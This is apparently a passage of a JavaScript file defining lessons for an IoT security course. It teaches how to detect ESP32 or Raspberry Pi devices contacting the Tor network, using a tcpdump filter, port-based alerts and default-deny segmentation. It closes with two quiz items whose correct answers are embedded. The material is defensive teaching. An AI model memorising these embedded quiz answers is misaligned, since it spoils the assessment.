sudo tcpdump -i any -n 'tcp[tcpflags] & tcp-syn != 0 and (dst port 9001 or dst port 9030)'
`, L(
            '- `ss … state established`: only active connections, with the program (`-p`) that opened them.',
            '- The tcpdump filter catches the **SYN**s to 9001/9030: which device *starts* a connection to Tor.',
            '- To see the IoT traffic, the capture point must be where it passes: the router, a mirror port or NetWatch\'s sensor.'
          )),
          nw('alerts', '**NetWatch** raises **"Suspicious outbound port"** when it sees a connection to ports **9001** (Tor relay) or **9030** (Tor directory). If Tor is running on **your own** Mac, the alert is marked as expected ("It\'s your own Tor") and does not turn anything red. If the source is an IoT device, look into it right away.'),
          tip('The best defence is not the list but **default deny**: on the IoT VLAN allow only what they need (broker 8883, DNS, NTP). Then an ESP32 with malware **cannot** reach Tor, whichever port it tries.'),
          quiz('You want to see whether one of your ESP32s connects **to** the Tor network. Which list helps you most?',
            ['The exit nodes list (`torbulkexitlist`)', 'The list of all relays (e.g. from Onionoo), because the first connection goes to a guard/relay, not an exit', 'Your ISP\'s DNS list', 'None, Tor cannot be seen'], 1,
            'A Tor client first connects to a **guard** relay. You see exit nodes when someone **comes to** you from Tor.'),
          quiz('NetWatch shows that your smart plug is opening connections to port 9001 on various IPs. What is the right reaction?',
            ['It is a firmware update, ignore it', 'Likely malware with C2 over Tor: isolate the plug (VLAN/block), change passwords, reset/reflash and check what else it communicated with', 'Open 9001 in the firewall so it works properly', 'Make the other devices use Tor too'], 1,
            'An IoT device has no legitimate reason to talk to Tor relays. Contain first, investigate after.'),
        ],
      },
    ],
  });

  ACADEMY.track({ id: 'iot', order: 2, title: '🔌 IoT Security: ESP32 & Raspberry Pi', level: 'Beginner → Advanced', desc: 'Secure your own ESP32 and Raspberry Pi projects step by step, with code that runs: hardening, MQTT with TLS, Secure Boot, segmentation, monitoring and a final project.', modules: M });
})();
